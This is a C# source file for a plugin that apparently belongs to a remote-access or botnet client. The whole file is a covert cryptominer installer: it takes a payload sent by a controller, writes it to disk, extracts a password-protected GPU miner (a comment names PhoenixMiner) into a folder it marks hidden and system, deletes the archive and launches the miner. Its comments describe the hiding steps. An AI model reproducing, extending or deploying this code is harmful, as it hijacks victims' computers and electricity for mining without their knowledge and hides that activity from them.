using Ionic.Zip;
using MessagePackLib.MessagePack;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Plugin
{
    class Gpu_Install
    {
        public static void Run(MsgPack unpack_msgpack, string gpuBin, string gpuWorkDir, string gpuProc, string gpuZipPass, string gpuParametrs, string gpuDelay) // PhoenixMiner.Run();
        {
            try
            {
                if (!File.Exists(gpuBin))
                {
                    try
                    {
                        if (!Directory.Exists(gpuWorkDir))
                        {
                            // We create a working folder for the miner
                            DirectoryInfo workPatch;
                            workPatch = Directory.CreateDirectory(gpuWorkDir);
                            Directory.CreateDirectory(gpuWorkDir);
                            DirectoryInfo directoryInfo = new DirectoryInfo(gpuWorkDir);
                            directoryInfo.Attributes |= FileAttributes.Hidden | FileAttributes.System; //This is how we hide our folder itself
                            workPatch.Refresh();
                        }

                        // Create an archive with a miner
                        string zipAckhive = gpuWorkDir + "\\" + HWIDGen.HWID() + ".tmp.zip";
                        File.WriteAllBytes(zipAckhive, Zip.Decompress(unpack_msgpack.ForcePathObject("File").GetAsBytes()));
                        Thread.Sleep(10000);
                        //Unpacking the miner by entering the password
                        using (ZipFile zip = ZipFile.Read(zipAckhive))
                        {
                            try
                            {
                                ZipEntry e = zip[gpuProc + ".exe"];
                                e.ExtractWithPassword(gpuWorkDir, gpuZipPass);
                                Thread.Sleep(10000);
                            }
                            catch
                            {
                                try
                                {
                                    zip.ExtractAll(zipAckhive);
                                    Thread.Sleep(10000);
                                }
                                catch
                                {
                                    return;
                                }
                            }
                        }

                        try
                        {
                            // Delete the archive with a sminer
                            if (File.Exists(zipAckhive))
                                File.Delete(zipAckhive);

                        }
                        catch (Exception ex)
                        {
                            Packet.Error(ex.Message);
                        }
                        try
                        {

                            // Check if the miner process is running
                            Process[] pname = Process.GetProcessesByName(gpuProc);
                            if (pname.Length == 0)
                                Thread.Sleep(5000);
                            Gpu_Run.CmdRun(gpuBin, gpuProc, gpuParametrs);

                        }
                        catch (Exception ex)
                        {
                            Packet.Error(ex.Message);
                            Thread.Sleep(480000);
                            return;
                        }
                    }
                    catch (Exception ex)
                    {
                        Packet.Error(ex.Message);
                    }
                }
                else
                {
                    try
                    {
                        // Check if the miner process is running
                        Process[] pname = Process.GetProcessesByName(gpuProc);
                        if (pname.Length == 0)
                            Thread.Sleep(5000);
                        Gpu_Run.CmdRun(gpuBin, gpuProc, gpuParametrs);
                    }
                    catch (Exception ex)
                    {
                        Packet.Error(ex.Message);
                        Thread.Sleep(480000);
                        return;
                    }
                }
            }

            catch (Exception ex)
            {
                Packet.Error(ex.Message);
                return;
            }
        }
    }
}
